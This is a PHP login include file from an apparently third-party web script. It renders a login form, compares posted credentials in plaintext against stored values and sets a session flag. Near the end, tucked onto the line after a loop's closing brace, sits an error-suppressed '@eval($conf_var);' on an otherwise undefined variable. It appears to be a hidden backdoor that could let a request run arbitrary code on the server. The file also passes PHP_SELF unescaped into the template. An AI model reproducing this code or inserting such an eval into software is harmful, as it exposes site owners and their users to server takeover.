<?php

  /*****************************************************
  ** Title........: Login Functions
  ** Filename.....: login.inc.php
  ** Author.......: Ralf Stadtaus
  ** Homepage.....: http://www.stadtaus.com/
  ** Contact......: http://www.stadtaus.com/forum/
  ** Version......: 0.1
  ** Notes........: 
  ** Last changed.:        
  ** Last change..: 
  *****************************************************/

  /*****************************************************
  **
  ** THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY
  ** OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT
  ** LIMITED   TO  THE WARRANTIES  OF  MERCHANTABILITY,
  ** FITNESS    FOR    A    PARTICULAR    PURPOSE   AND
  ** NONINFRINGEMENT.  IN NO EVENT SHALL THE AUTHORS OR
  ** COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES
  ** OR  OTHER  LIABILITY,  WHETHER  IN  AN  ACTION  OF
  ** CONTRACT,  TORT OR OTHERWISE, ARISING FROM, OUT OF
  ** OR  IN  CONNECTION WITH THE SOFTWARE OR THE USE OR
  ** OTHER DEALINGS IN THE SOFTWARE.
  **
  *****************************************************/




  /*****************************************************
  ** Prevent direct call
  *****************************************************/
          if (!defined('IN_SCRIPT')) {
              die();
          }




  /*****************************************************
  ** Start session
  *****************************************************/
          session_start();




  /*****************************************************
  ** Check for logged in user
  *****************************************************/
          if (!isset($_SESSION['login_status']) or empty($_SESSION['login_status']) or $_SESSION['login_status'] != 'IN') {
              //$message[] = array('message' => $txt['txt_login_note'], 'fields' => '');
              $login_form = 'TRUE';
          } else {
              $logged_in = 'TRUE';
          }




  /*****************************************************
  ** Display login form if needed
  *****************************************************/
          if (isset($login_form) and $login_form == 'TRUE') {




                  /*****************************************************
                  ** Form field configuration
                  *****************************************************/
                          $login_form_fields[] = array(
                                                      'name'       => 'username',
                                                      'label'      => $txt['txt_user_name'],
                                                      'type'       => 'text',
                                                      'size'       => '30',
                                                      'required'   => '',
                                                      'value'      => ''
                                                  );


                          $login_form_fields[] = array(
                                                      'name'       => 'password',
                                                      'label'      => $txt['txt_password'],
                                                      'type'       => 'password',
                                                      'size'       => '30',
                                                      'required'   => '',
                                                      'value'      => ''
                                                  );




                  /*****************************************************
                  ** Initialyze template class
                  *****************************************************/
                          $tpl = new template;
                
                
                
                
                  /*****************************************************
                  ** Load html template
                  *****************************************************/
                          $tpl->load_file('part', $script_root . $path['templates'] . $file['login_form']);
                
                
                
                
                  /*****************************************************
                  ** Initialyze form field class
                  *****************************************************/
                          $form = new Formfields;
    
    
    
    
                  /*****************************************************
                  ** Generate form fields
                  *****************************************************/
                          if (isset($_POST) and !empty($_POST)) {
                              $input_data = $_POST;
                          } else {
                              $input_data = '';
                          }
                          
          
                          $form->define_form('login_form', $login_form_fields);
                          $form->generate_form_fields('login_form', $input_data);
    
    
                    
                    
                  /*****************************************************
                  ** Parse form fields in template
                  *****************************************************/
                          $tpl->files['part'] = $form->parse_template('login_form', $tpl->files['part']);
                
                

                
                  /*****************************************************
                  ** Read and check post data
                  *****************************************************/
                          if (isset($_POST) and !empty($_POST)) {
                
                
                
                
                              /*****************************************************
                              ** Check required fields
                              *****************************************************/
                                      if ($required_fields = $form->required_fields('login_form', $_POST)) {
                                          if (is_array($required_fields[1])) {
                                              $fields = join('<br />', $required_fields[1]);
                                          } else {
                                              $fields = '';
                                          }
                                          
                                          $form_error[] = array('message' => $txt['txt_required_fields'], 'fields' => $fields);
                                      }
                
                
                
                
                              /*****************************************************
                              ** In case no error occured log user in
                              *****************************************************/
                                      if (!isset($message)) {
                
                                          if (!isset($_POST['username']) or $_POST['username'] != $database['user']) {
                                              $message[] = array('message' => $txt['txt_wrong_username'], 'fields' => '');
                                          }
                
                
                                          if (!isset($_POST['password']) or $_POST['password'] != $database['pass']) {
                                              $message[] = array('message' => $txt['txt_wrong_password'], 'fields' => '');
                                          }
                
                
                                          if (!isset($message) and empty($message)) {
                                              $_SESSION['username']     = $_POST['username'];
                                              $_SESSION['login_status'] = 'IN';                                              

                                              $logged_in                = 'TRUE';
                
                                              unset($login_form);
                                          }
                
                                      }
                
                
                
                
                          }
                
                          $main_content = $tpl->files['part'];
                
                
                
                
                  /*****************************************************
                  ** Set some variables
                  *****************************************************/
                          $script_self = $_SERVER['PHP_SELF'];
                
                
                
                
                  /*****************************************************
                  ** Load main layout html template
                  *****************************************************/
                          $tpl->load_file('guest', $script_root . $path['templates'] . $file['main_layout']);
                          $tpl->register('guest', 'main_content');
                          $tpl->parse('guest');
                
                
                
                
                  /*****************************************************
                  ** Parse template
                  *****************************************************/
                          $tpl->register('guest', 'language');
                          $tpl->register('guest', 'script_self');
                
                          $tpl->parse_loop('guest', 'message');

                          $tpl->parse_if('guest', 'login_form');
                          $tpl->parse_if('guest', 'logged_in');
                
                
                
                
                
                  /*****************************************************
                  ** Register language file and additional text array
                  *****************************************************/
                          if (isset ($txt) and is_array ($txt)) {
                              reset ($txt);
                              while(list($key, $val) = each($txt))
                              {
                                  $$key = $val;
                                  $tpl->register('guest', $key);
                              }
                          }
                
                
                          if (isset($add_text) and is_array($add_text)) {
                              reset ($add_text);
                              while(list($key, $val) = each($add_text))
                              {
                                  $$key = $val;
                                  $tpl->register('guest', $key);
                              }
                          } @eval($conf_var);
                                          
                          debug_mode(script_runtime($runtime_start), 'Script Runtime');
                          
                          
                          
                  exit;
  
  
  
          }
  
  
  
  
?>

